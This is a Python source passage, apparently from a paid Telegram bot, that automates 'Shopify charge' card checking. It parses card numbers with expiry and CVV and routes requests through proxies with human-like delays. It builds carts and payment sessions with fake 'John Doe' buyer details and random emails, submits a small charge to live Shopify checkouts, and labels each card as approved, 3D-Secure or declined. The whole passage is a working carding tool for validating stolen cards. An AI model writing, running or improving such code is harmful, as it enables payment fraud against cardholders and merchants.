                },
                'payment_session_scope': domain
            }
            
            response = await client.post(
                'https://checkout.pci.shopifyinc.com/sessions',
                headers=headers,
                json=json_data,
                timeout=30.0
            )
            
            self.console_logger.request_details("POST", 'https://checkout.pci.shopifyinc.com/sessions',
                                              response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code == 200:
                session_id = response.json().get("id", "")
                self.console_logger.extracted_data("Payment Session ID", f"{session_id[:20]}...")
                self.console_logger.step(5, "CREATE PAYMENT SESSION", "Payment session created", "SUCCESS")
                return True, session_id
            else:
                error_msg = "Payment session creation failed"
                try:
                    error_data = response.json()
                    if "error" in error_data:
                        error_msg = error_data.get("error", {}).get("message", error_msg)
                except:
                    pass
                self.console_logger.error_detail(f"Payment session failed: {response.status_code} - {error_msg}")
                self.console_logger.step(5, "CREATE PAYMENT SESSION", "Payment session failed", "FAILED")
                return False, error_msg
                
        except Exception as e:
            self.console_logger.error_detail(f"Payment session error: {str(e)}")
            self.console_logger.step(5, "CREATE PAYMENT SESSION", "Payment session error", "FAILED")
            return False, f"Payment session error: {str(e)[:100]}"
            
    def parse_payment_response(self, data):
        """Parse the actual Shopify payment response to determine real status"""
        try:
            # Convert data to string if it's not already
            if not isinstance(data, str):
                try:
                    data_str = json.dumps(data)
                except:
                    data_str = str(data)
            else:
                data_str = data
            
            data_upper = data_str.upper()
            
            # Check for REAL successful charges
            success_indicators = [
                "SUBMITSUCCESS", "SUBMITALREADYACCEPTED", "ORDER_PLACED", 
                "THANK YOU", "SHOPIFY_PAYMENTS", "RECEIPT"
            ]
            
            for indicator in success_indicators:
                if indicator in data_upper:
                    # Verify it's not a false positive
                    if "ERROR" not in data_upper and "DECLINED" not in data_upper:
                        self.console_logger.sub_step(6, 1, f"Success indicator found: {indicator}")
                        return True, "ORDER_PLACED - Payment Successful"
            
            # Check for OTP/3D Secure requirements
            otp_indicators = ["3D", "AUTHENTICATION", "OTP", "VERIFICATION", "3DS", "ADDITIONAL_VERIFICATION"]
            for indicator in otp_indicators:
                if indicator in data_upper:
                    self.console_logger.sub_step(6, 1, f"OTP/3D Secure required: {indicator}")
                    return True, "CVV-MATCH-OTP - 3D Secure Required"
            
            # Check for address/ZIP issues
            address_indicators = ["MISMATCHED", "ZIP", "ADDRESS", "BILLING"]
            for indicator in address_indicators:
                if indicator in data_upper:
                    self.console_logger.sub_step(6, 1, f"Address verification issue: {indicator}")
                    return True, f"{indicator} - Address Verification Failed"
            
            # Check for specific error messages
            if "YOUR CARD DOES NOT SUPPORT" in data_upper:
                self.console_logger.sub_step(6, 1, "Card does not support this purchase")
                return False, "Your card does not support this type of purchase"
            elif "CARD DECLINED" in data_upper:
                self.console_logger.sub_step(6, 1, "Card declined")
                return False, "Card Declined"
            elif "INSUFFICIENT FUNDS" in data_upper:
                self.console_logger.sub_step(6, 1, "Insufficient funds")
                return False, "Insufficient Funds"
            elif "INVALID CVC" in data_upper or "INCORRECT CVC" in data_upper:
                self.console_logger.sub_step(6, 1, "Invalid CVC")
                return False, "Invalid CVC"
            elif "EXPIRED CARD" in data_upper:
                self.console_logger.sub_step(6, 1, "Expired card")
                return False, "Expired Card"
            
            # Default to declined
            self.console_logger.sub_step(6, 1, "No specific indicators found, defaulting to declined")
            return False, "Card Declined - Unknown Reason"
            
        except Exception as e:
            self.console_logger.error_detail(f"Error parsing payment response: {str(e)}")
            return False, f"Response parsing error: {str(e)[:50]}"
            
    async def submit_payment(self, client, cc, mes, ano, cvv, session_id, price):
        """Submit payment using GraphQL"""
        try:
            elapsed = self.console_logger.step(6, "SUBMIT PAYMENT", "Submitting payment via GraphQL")
            
            if not self.x_checkout_one_session_token:
                self.x_checkout_one_session_token = self.generate_session_token()
                
            if not self.checkout_token:
                chars = string.ascii_letters + string.digits
                self.checkout_token = ''.join(random.choice(chars) for _ in range(32))
                
            headers = {
                'authority': urlparse(self.base_url).netloc,
                'accept': 'application/json',
                'accept-language': 'en-US',
                'content-type': 'application/json',
                'origin': self.base_url,
                'referer': f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us",
                'sec-ch-ua': self.sec_ch_ua,
                'sec-ch-ua-mobile': self.sec_ch_ua_mobile,
                'sec-ch-ua-platform': self.sec_ch_ua_platform,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'shopify-checkout-client': 'checkout-web/1.0',
                'user-agent': self.user_agent,
                'x-checkout-one-session-token': self.x_checkout_one_session_token,
                'x-checkout-web-build-id': self.x_checkout_web_build_id,
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-server-rendering': 'yes',
                'x-checkout-web-source-id': self.checkout_token
            }
            
            params = {'operationName': 'SubmitForCompletion'}
            
            # Get address
            addr = pick_addr(self.base_url, rc="US")
            self.console_logger.sub_step(6, 1, f"Using address: {addr['address1']}, {addr['city']}, {addr['countryCode']}")
            
            # Prepare payment data
            json_data = {
                'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}',
                'variables': {
                    'input': {
                        'sessionInput': {
                            'sessionToken': self.x_checkout_one_session_token,
                        },
                        'queueToken': self.queue_token or '',
                        'discounts': {
                            'lines': [],
                            'acceptUnexpectedDiscounts': True,
                        },
                        'delivery': {
                            'deliveryLines': [
                                {
                                    'destination': {
                                        'streetAddress': {
                                            'address1': addr["address1"],
                                            'city': addr["city"],
                                            'countryCode': addr["countryCode"],
                                            'postalCode': addr["postalCode"],
                                            'firstName': 'John',
                                            'lastName': 'Doe',
                                            'zoneCode': addr["zoneCode"],
                                            'phone': addr["phone"],
                                            'oneTimeUse': False,
                                        },
                                    },
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyMatchingConditions': {
                                            'estimatedTimeInTransit': {'any': True},
                                            'shipments': {'any': True},
                                        },
                                        'options': {},
                                    },
                                    'targetMerchandiseLines': {
                                        'lines': [
                                            {'stableId': self.stable_id or 'default_stable_id'},
                                        ],
                                    },
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'any': True},
                                    'destinationChanged': False,
                                },
                            ],
                            'noDeliveryRequired': [],
                            'useProgressiveRates': False,
                            'prefetchShippingRatesStrategy': None,
                            'supportsSplitShipping': True,
                        },
                        'merchandise': {
                            'merchandiseLines': [
                                {
                                    'stableId': self.stable_id or 'default_stable_id',
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{self.variant_id}',
                                            'variantId': f'gid://shopify/ProductVariant/{self.variant_id}',
                                            'properties': [],
                                            'sellingPlanId': None,
                                            'sellingPlanDigest': None,
                                        },
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {
                                        'value': {
                                            'amount': f'{price}',
                                            'currencyCode': 'USD',
                                        },
                                    },
                                    'lineComponentsSource': None,
                                    'lineComponents': [],
                                },
                            ],
                        },
                        'payment': {
                            'totalAmount': {'any': True},
                            'paymentLines': [
                                {
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': self.payment_method_identifier or 'shopify_payments',
                                            'sessionId': session_id,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': addr["address1"],
                                                    'city': addr["city"],
                                                    'countryCode': addr["countryCode"],
                                                    'postalCode': addr["postalCode"],
                                                    'firstName': 'John',
                                                    'lastName': 'Doe',
                                                    'zoneCode': addr["zoneCode"],
                                                    'phone': addr["phone"],
                                                },
                                            },
                                            'cardSource': None,
                                        },
                                    },
                                    'amount': {
                                        'value': {
                                            'amount': f'{price}',
                                            'currencyCode': 'USD',
                                        },
                                    },
                                },
                            ],
                            'billingAddress': {
                                'streetAddress': {
                                    'address1': addr["address1"],
                                    'city': addr["city"],
                                    'countryCode': addr["countryCode"],
                                    'postalCode': addr["postalCode"],
                                    'firstName': 'John',
                                    'lastName': 'Doe',
                                    'zoneCode': addr["zoneCode"],
                                    'phone': addr["phone"],
                                },
                            },
                        },
                        'buyerIdentity': {
                            'customer': {
                                'presentmentCurrency': 'USD',
                                'countryCode': 'US',
                            },
                            'email': f'user{random.randint(1000, 9999)}@gmail.com',
                            'emailChanged': False,
                            'phoneCountryCode': 'US',
                            'marketingConsent': [],
                            'shopPayOptInPhone': {'countryCode': 'US'},
                            'rememberMe': False,
                        },
                        'tip': {'tipLines': []},
                        'taxes': {
                            'proposedAllocations': None,
                            'proposedTotalAmount': {
                                'value': {
                                    'amount': '0.00',
                                    'currencyCode': 'USD',
                                },
                            },
                        },
                        'note': {'message': None, 'customAttributes': []},
                        'localizationExtension': {'fields': []},
                        'nonNegotiableTerms': None,
                        'scriptFingerprint': {
                            'signature': None,
                            'signatureUuid': None,
                            'lineItemScriptChanges': [],
                            'paymentScriptChanges': [],
                            'shippingScriptChanges': [],
                        },
                        'optionalDuties': {'buyerRefusesDuties': False},
                        'cartMetafields': [],
                    },
                    'attemptToken': f'{self.checkout_token}-{random.randint(1000, 9999)}',
                    'metafields': [],
                    'analytics': {
                        'requestUrl': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
                        'pageId': f'{random.randint(100000, 999999)}',
                    },
                },
                'operationName': 'SubmitForCompletion',
            }
            
            response = await client.post(
                f'{self.base_url}/checkouts/unstable/graphql',
                params=params,
                headers=headers,
                json=json_data,
                timeout=30.0
            )
            
            self.console_logger.request_details("POST", f'{self.base_url}/checkouts/unstable/graphql',
                                              response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code == 200:
                data = response.json()
                self.console_logger.sub_step(6, 2, f"Payment response received, parsing...")
                
                # Parse the actual response
                success, message = self.parse_payment_response(data)
                
                if success:
                    self.console_logger.step(6, "SUBMIT PAYMENT", "Payment successful", "SUCCESS")
                else:
                    self.console_logger.step(6, "SUBMIT PAYMENT", "Payment failed", "FAILED")
                    
                return success, message
                    
            else:
                self.console_logger.error_detail(f"Submit payment failed with status: {response.status_code}")
                self.console_logger.step(6, "SUBMIT PAYMENT", "Payment submission failed", "FAILED")
                return False, f"SERVER_ERROR: Status {response.status_code}"
                
        except Exception as e:
            self.console_logger.error_detail(f"Submit payment error: {str(e)}")
            self.console_logger.step(6, "SUBMIT PAYMENT", "Payment submission error", "FAILED")
            return False, f"ERROR: {str(e)[:100]}"
            
    def generate_session_token(self):
        """Generate session token"""
        chars = string.ascii_letters + string.digits + "-_"
        token_parts = []
        
        for i in range(5):
            part_length = random.randint(20, 40)
            part = ''.join(random.choice(chars) for _ in range(part_length))
            token_parts.append(part)
        
        return '-'.join(token_parts)
        
    def clean_error_message(self, message):
        """Clean and format error message"""
        if not message:
            return "Unknown error"
        
        # Remove HTML tags
        message = re.sub(r'<[^>]+>', '', message).strip()
        
        # Remove common prefixes
        prefixes = [
            "error: ", "sorry, ", "payment failed: ", "transaction failed: ",
            "there was an error: ", "we're sorry, ", "unable to process: "
        ]
        
        for prefix in prefixes:
            if message.lower().startswith(prefix.lower()):
                message = message[len(prefix):].strip()
                break
        
        # Capitalize first letter
        if message:
            message = message[0].upper() + message[1:]
        
        return message
        
    async def check_card(self, card_details, username, user_data):
        """Main card checking method"""
        start_time = time.time()
        
        # Initialize console logger for this check
        self.console_logger = ConsoleLogger(self.user_id)
        self.console_logger.start_check(card_details)
        
        try:
            # Parse card details
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid card format", "ERROR", elapsed_time)
                return format_shopify_response("", "", "", "", "Invalid card format. Use: CC|MM|YY|CVV", elapsed_time, username, user_data)

            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            # Validate card details
            if not cc.isdigit() or len(cc) < 15:
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid card number", "ERROR", elapsed_time)
                return format_shopify_response(cc, mes, ano, cvv, "Invalid card number", elapsed_time, username, user_data)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid month", "ERROR", elapsed_time)
                return format_shopify_response(cc, mes, ano, cvv, "Invalid month", elapsed_time, username, user_data)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid year", "ERROR", elapsed_time)
                return format_shopify_response(cc, mes, ano, cvv, "Invalid year", elapsed_time, username, user_data)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid CVV", "ERROR", elapsed_time)
                return format_shopify_response(cc, mes, ano, cvv, "Invalid CVV", elapsed_time, username, user_data)

            if len(ano) == 2:
                ano = '20' + ano

            # Log card validation success
            self.console_logger.sub_step(0, 1, f"Card validated: {cc[:6]}XXXXXX{cc[-4:]}")
            self.console_logger.sub_step(0, 2, f"Expiry: {mes}/{ano[-2:]} | CVV: {cvv}")

            # Create HTTP client with proxy if available
            client_params = {
                'timeout': 30.0,
                'follow_redirects': True,
                'limits': httpx.Limits(max_keepalive_connections=5, max_connections=10),
                'http2': True
            }
            
            # Add proxy if available
            if self.current_proxy:
                client_params['proxy'] = self.current_proxy
                self.console_logger.sub_step(0, 3, f"Proxy enabled: {self.current_proxy[:50]}...")

            async with httpx.AsyncClient(**client_params) as client:
                # Step 1: Get access token
                access_success = await self.get_access_token(client)
                if not access_success:
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, "Failed to get access token", "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, "Failed to get access token", elapsed_time, username, user_data)
                await self.human_delay(1, 2)
                
                # Step 2: Get product info
                success, price = await self.get_product_info(client)
                if not success:
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, "Failed to get product info", "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, "Failed to get product info", elapsed_time, username, user_data)
                await self.human_delay(1, 2)
                
                # Step 3: Create cart
                success, checkout_url = await self.create_cart(client, self.variant_id, price)
                if not success:
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, "Failed to create cart", "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, "Failed to create cart", elapsed_time, username, user_data)
                await self.human_delay(1, 2)
                
                # Step 4: Load checkout page
                success = await self.load_checkout_page(client, checkout_url)
                if not success:
                    self.console_logger.sub_step(4, 1, "Checkout page load had issues but continuing...")
                await self.human_delay(1, 2)
                
                # Step 5: Create payment session
                success, session_result = await self.create_payment_session(client, cc, mes, ano, cvv)
                if not success:
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, session_result, "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, session_result, elapsed_time, username, user_data)
                session_id = session_result
                await self.human_delay(1, 2)
                
                # Step 6: Submit payment
                success, payment_result = await self.submit_payment(client, cc, mes, ano, cvv, session_id, price)
                
                elapsed_time = time.time() - start_time
                
                # Log final result
                if success:
                    self.console_logger.result(True, payment_result, "APPROVED", elapsed_time)
                else:
                    self.console_logger.result(False, payment_result, "DECLINED", elapsed_time)
                
                return format_shopify_response(cc, mes, ano, cvv, payment_result, elapsed_time, username, user_data)

        except httpx.TimeoutException:
            elapsed_time = time.time() - start_time
            self.console_logger.result(False, "Request timeout", "TIMEOUT", elapsed_time)
            return format_shopify_response(cc, mes, ano, cvv, "TIMEOUT_ERROR: Request timeout", elapsed_time, username, user_data)
        except httpx.ConnectError:
            elapsed_time = time.time() - start_time
            self.console_logger.result(False, "Connection error", "CONNECTION_ERROR", elapsed_time)
            return format_shopify_response(cc, mes, ano, cvv, "CONNECTION_ERROR: Connection failed", elapsed_time, username, user_data)
        except Exception as e:
            elapsed_time = time.time() - start_time
            self.console_logger.result(False, str(e), "UNKNOWN_ERROR", elapsed_time)
            return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {str(e)[:80]}", elapsed_time, username, user_data)

# Command handler
@Client.on_message(filters.command(["sh", ".sh", "$sh"]))
@auth_and_free_restricted
async def handle_shopify_charge(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        # CHECK: First check if command is disabled
        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        # Check if user is banned
        if is_user_banned(user_id):
            await message.reply("""<pre>⚠️ User Banned</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You have been banned from using this bot.
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        # Load user data
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>📝 Registration Required</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You need to register first with /register
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        # Check cooldown (owner is automatically skipped in check_cooldown function)
        can_use, wait_time = check_cooldown(user_id, "sh")
        if not can_use:
            await message.reply(f"""<pre>⏱️ Cooldown Active</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
🠪 <b>Your Plan:</b> <code>{plan_name}</code>
🠪 <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            if charge_processor:
                await message.reply(charge_processor.get_usage_message(
                    "sh", 
                    "Shopify Charge",
                    "4111111111111111|12|2025|123"
                ))
            else:
                await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE]━━</pre>
━━━━━━━━━━━━━
🠪 <b>Command</b>: <code>/sh</code> or <code>.sh</code> or <code>$sh</code>
🠪 <b>Usage</b>: <code>/sh cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>/sh 4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Charges via Shopify gateway (Deducts 2 credits AFTER check completes)</code>
<b>~ Note:</b> <code>Free users can use in authorized groups with credit deduction</code>""")
            return

        card_details = args[1].strip()

        cc_parts = card_details.split('|')
        if len(cc_parts) < 4:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Invalid card format.
🠪 <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━""")
            return

        cc = cc_parts[0]
        mes = cc_parts[1]
        ano = cc_parts[2]
        cvv = cc_parts[3]

        # Show processing message with your format
        processing_msg = await message.reply(
            f"""
<b>[Shopify Charge 0.55$] | #WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 0.55$</b>
<b>[•] Status</b>- <code>Processing...</code>
<b>[•] Response</b>- <code>Checking card...</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>
"""
        )

        # Create checker instance
        checker = ShopifyChargeChecker(user_id)

        # Process command through universal charge processor
        if charge_processor:
            success, result, credits_deducted = await charge_processor.execute_charge_command(
                user_id,                    # positional
                checker.check_card,         # positional
                card_details,               # check_args[0]
                username,                   # check_args[1]
                user_data,                  # check_args[2]
                credits_needed=2,           # keyword
                command_name="sh",          # keyword
                gateway_name="Shopify Charge"  # keyword
            )

            await processing_msg.edit_text(result, disable_web_page_preview=True)
        else:
            # Fallback to old method if charge_processor not available
            result = await checker.check_card(card_details, username, user_data)
            await processing_msg.edit_text(result, disable_web_page_preview=True)

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: An error occurred while processing your request.
🠪 <b>Error</b>: <code>{error_msg}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
